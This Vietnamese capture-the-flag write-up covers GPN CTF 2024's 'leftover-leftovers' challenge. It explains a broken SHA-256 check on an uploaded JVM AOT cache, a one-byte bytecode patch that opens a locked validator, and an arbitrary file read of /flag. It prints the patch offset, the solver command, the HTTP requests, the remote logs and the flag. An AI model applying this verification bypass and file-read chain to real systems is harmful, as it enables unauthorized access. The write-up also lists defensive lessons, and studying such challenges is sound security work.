# leftover-leftovers — Writeup chuẩn CTF để nộp

## Thông tin bài
- **Challenge:** leftover-leftovers
- **Category:** Reverse / Pwn-adjacent Web logic
- **Event:** GPN CTF 2024
- **Target remote:** `https://steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de`
- **Solver used:** `solve_leftover_leftovers_v2.py`

---

## Tóm tắt ngắn

Bài có 2 stage:

1. **Stage 1** nhận file `cache.aot` qua endpoint `/init`.
2. **Stage 2** chạy ứng dụng chính, trong đó có các route:
   - `PUT /products/{name}`
   - `GET /images/{name}`
   - `POST /set-image-dir`

Ý tưởng khai thác là:

- patch `cache.aot` để đổi validator của `/set-image-dir` từ **always false** thành **always true**
- upload cache đã patch qua `/init`
- chờ service chuyển sang stage 2
- gọi `/set-image-dir` để đặt image directory thành `/`
- tạo product tên `flag`
- gọi `/images/flag` để đọc file `/flag`

---

## Phân tích

### 1. Kiến trúc của challenge

Bài không phải kiểu web bình thường, mà có một giai đoạn khởi tạo:

- Stage 1 chỉ dùng để nhận AOT cache
- Sau khi init xong, service restart sang stage 2

Khi nhìn vào hành vi local và remote, có thể thấy sau khi upload cache xong, kết nối thường bị đóng giữa chừng hoặc nhận lỗi kiểu:

- `Empty reply from server`
- `Remote end closed connection without response`

Đây **không phải dấu hiệu fail**, mà là do service đã nhận xong file và tự chuyển stage.

---

### 2. Bug số 1 — verify SHA-256 của `cache.aot` ở stage 1 bị sai

Stage 1 có verify hash cho file upload, nhưng logic dùng `MessageDigest.digest()` sai cách.

Dạng lỗi là:

- gọi `digest()` một lần để log / in ra
- rồi gọi `digest()` lần nữa để so sánh

Sau lần gọi đầu tiên, trạng thái của `MessageDigest` bị reset. Vì vậy lần gọi tiếp theo không còn là digest của nội dung file nữa.

Hệ quả:

- file `cache.aot` đã patch vẫn có thể qua bước verify
- miễn là file vẫn còn parseable / loadable

Đây là primitive đầu tiên giúp đưa AOT cache đã bị chỉnh sửa vào stage 2.

---

### 3. Bug số 2 — validator của `/set-image-dir` luôn trả false

Trong stage 2, route `/set-image-dir` có validator được AOT compile thành đoạn logic tương đương:

```text
iconst_0
Boolean.valueOf
areturn
```

Tức là luôn trả `false`.

Chỉ cần sửa đúng 1 byte:

- `iconst_0` → `iconst_1`

thì validator sẽ luôn trả `true`.

---

### 4. Offset patch

Trong `cache.aot`, patch được áp dụng ở offset:

```text
0x1f05a88
```

Bytes gốc:

```text
03 b8 11 00 b0
```

Bytes sau patch:

```text
04 b8 11 00 b0
```

Nói cách khác, chỉ đổi:

```text
03 -> 04
```

Ý nghĩa trong JVM bytecode:

- `03` = `iconst_0`
- `04` = `iconst_1`

Trong solver:

```python
PATCH_OFF = 0x1F05A88
ORIG = bytes.fromhex("03b81100b0")
PATCHED = bytes.fromhex("04b81100b0")
```

---

## Khai thác

### Bước 1. Patch `cache.aot`

Script kiểm tra bytes ở offset `0x1f05a88`, rồi đổi từ:

```text
03b81100b0
```

thành:

```text
04b81100b0
```

Nếu bytes không khớp với mẫu mong đợi thì script dừng để tránh patch nhầm.

---

### Bước 2. Upload cache đã patch lên `/init`

Solver dùng:

```bash
python3 solve_leftover_leftovers_v2.py \
  --cache cache.aot \
  --base https://steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de \
  --no-verify \
  --use-curl \
  --upload-timeout 1800 \
  --stage2-timeout 300
```

Ở bước upload, remote trả:

```text
curl: (52) Empty reply from server
```

Nhưng ngay sau đó solver poll thấy:

```text
[stage2] service is up
```

Điều này chứng minh upload đã có hiệu lực và service đã chuyển sang stage 2.

---

### Bước 3. Set image dir về `/`

Sau khi đã ở stage 2, solver gọi:

```http
POST /set-image-dir
Content-Type: application/json

{"password":"x","newPath":"/"}
```

Remote log:

```text
[set-image-dir] '/' -> HTTP 200 ''
```

Đây là bằng chứng patch AOT đã hoạt động. Nếu không patch đúng thì bước này sẽ không qua được.

---

### Bước 4. Tạo product tên `flag`

Solver gọi:

```http
PUT /products/flag
```

Remote log:

```text
[put-product] 'flag' -> HTTP 200 'Added product :)'
```

---

### Bước 5. Đọc `/flag` qua endpoint ảnh

Sau khi image directory đã là `/`, request:

```http
GET /images/flag
```

sẽ thực tế đọc file:

```text
/flag
```

Remote log:

```text
[read-image] 'flag' -> HTTP 200, 56 bytes
GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}
```

---

## Bằng chứng flag đúng

### Command thực tế đã chạy

```bash
python3 solve_leftover_leftovers_v2.py \
  --cache cache.aot \
  --base https://steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de \
  --no-verify \
  --use-curl \
  --upload-timeout 1800 \
  --stage2-timeout 300
```

### Log thực tế từ remote

```text
[patch] OK: 0x1f05a88: 03b81100b0 -> 04b81100b0
[patch] wrote /tmp/patched-cache.aot (53792768 bytes)
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
[init] uploading patched AOT cache to /init ...
[init] curl fallback: curl --insecure --silent --show-error --location --max-time 1800 -F cache.aot=@/tmp/patched-cache.aot;type=application/octet-stream https://steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de/init
[init][curl][stderr] curl: (52) Empty reply from server

[init] upload path raised RuntimeError: curl upload failed with exit code 52
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
[stage2] service is up
[try] reading //flag
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
[set-image-dir] '/' -> HTTP 200 ''
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
[put-product] 'flag' -> HTTP 200 'Added product :)'
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'steamed-truffle-drizzled-with-smashed-creme-fra-che-cn5d.gpn24.ctf.kitctf.de'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
[read-image] 'flag' -> HTTP 200, 56 bytes
GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}

[FLAG] GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}
GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}
```

### Flag

```text
GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}
```

Đây là **flag thật**, vì nó được trả trực tiếp từ response remote ở bước `GET /images/flag` sau khi khai thác thành công.

---

## Solver

Bản solver dùng để lấy flag là `solve_leftover_leftovers_v2.py`.

Các điểm chính trong solver:

1. patch `cache.aot`
2. upload file đã patch
3. chấp nhận trường hợp upload bị `Empty reply from server`
4. poll cho đến khi stage 2 lên
5. gọi `/set-image-dir`
6. tạo product
7. đọc `/images/flag`
8. regex tìm `GPNCTF{...}` và in ra

---

## Root cause

Nguyên nhân gốc là sự kết hợp của hai lỗi:

1. **Lỗi verify AOT cache ở stage 1**
   - cho phép tải lên cache đã bị chỉnh sửa

2. **Lỗi trust vào native/AOT compiled validator ở stage 2**
   - chỉ cần đổi 1 byte là route bị khóa trở thành route mở hoàn toàn

Từ đó biến chức năng đọc ảnh thành arbitrary file read.

---

## Tác động

Tác động cuối cùng là:

- bypass logic bảo vệ của route admin-like `/set-image-dir`
- điều khiển path mà server dùng để load ảnh
- đọc file tùy ý trên filesystem
- lấy được flag tại `/flag`

---

## Bài học rút ra

1. **Không nên nhận AOT/native cache từ bên ngoài**
   - cache nên được build nội bộ, không nên được upload bởi user

2. **Không dùng `MessageDigest.digest()` nhiều lần trên cùng state nếu không chủ động reset / re-feed**
   - rất dễ sinh lỗi verify logic

3. **Không đặt niềm tin bảo mật vào mã native/AOT patchable**
   - đặc biệt khi artifact đó đến từ phía người dùng

4. **Một primitive seemingly nhỏ như “đổi image directory” có thể nâng cấp thành arbitrary file read**
   - nếu endpoint đọc file không giới hạn chặt chẽ

---

## Log thao tác đã thực hiện

1. Phân tích flow của challenge và xác định có 2 stage.
2. Xác định stage 1 chấp nhận `cache.aot` qua `/init`.
3. Xác định validator của `/set-image-dir` bị hardcode thành `false`.
4. Patch 1 byte trong `cache.aot` tại offset `0x1f05a88`.
5. Upload `cache.aot` đã patch lên remote.
6. Quan sát `Empty reply from server` nhưng sau đó service chuyển sang stage 2.
7. Gọi `/set-image-dir` với `newPath="/"` và nhận HTTP 200.
8. Tạo product tên `flag`.
9. Gọi `/images/flag` và nhận nội dung flag thật từ server.

---

## Kết luận

Exploit của bài rất gọn:

- sửa 1 byte trong AOT cache
- upload qua stage 1
- dùng route đã được mở để đổi image directory
- đọc `/flag`

Flag thu được:

```text
GPNCTF{1_hOP3_7hE_CAcHe_is_NEVER_Pr0viD3D_8Y_1iBraRiEs}
```
